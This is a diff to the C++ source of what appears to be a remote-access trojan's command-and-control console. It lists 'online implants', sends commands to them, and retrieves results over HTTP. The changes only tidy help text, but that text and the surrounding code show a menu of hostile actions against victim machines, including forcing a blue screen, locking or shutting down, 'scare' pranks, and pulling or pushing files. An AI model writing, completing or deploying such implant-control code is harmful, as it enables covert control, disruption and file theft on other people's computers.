@@ -81,11 +81,7 @@ int main() {
     std::wstring TOKEN = L"CHANGE_ME_LONG_RANDOM";
 
     std::cout << "=== panel v1 ===\n";
-    std::cout << "commands: list, use <id>, send <cmd>, results, exit\n";
-    std::cout << "special: screen_off screen_on lock beep mute vol_max vol_0 vol_50\n";
-    std::cout << "         msg <text> shutdown restart cancel scare wall party\n";
-    std::cout << "         bsod flip flip_reset cursor_hide cursor_show open <path>\n";
-    std::cout << "         get <path>  put <path> <b64>\n\n";
+    std::cout << "commands: list, use <id>, send <cmd>, results, exit, help\n\n";
 
     std::string active, line;
     while (true) {
@@ -100,12 +96,12 @@ int main() {
         }
         else if (line == "help") {
             std::cout << "commands:\n"
-                      << "  list                - show online implants\n"
-                      << "  use <id>            - select implant\n"
-                      << "  send <cmd>          - send command\n"
-                      << "  results             - get output\n"
-                      << "  exit                - quit\n\n"
-                      << "special commands (send ...):\n"
+                      << "  list                 - show online implants\n"
+                      << "  use <id>             - select implant\n"
+                      << "  send <cmd>           - send command\n"
+                      << "  results              - get output\n"
+                      << "  exit                 - quit\n\n"
+                      << "special (send ...):\n"
                       << "  screen_off screen_on lock beep\n"
                       << "  mute vol_max vol_0 vol_50\n"
                       << "  msg <text>  open <path>\n"
@@ -131,7 +127,7 @@ int main() {
             std::cout << HttpGet(HOST, PORT, TOKEN,
                                  L"/panel/results/" + Widen(active)) << "\n";
         }
-        else std::cout << "unknown. type 'help' for commands\n";
+        else std::cout << "unknown. type 'help'\n";
     }
     return 0;
 }
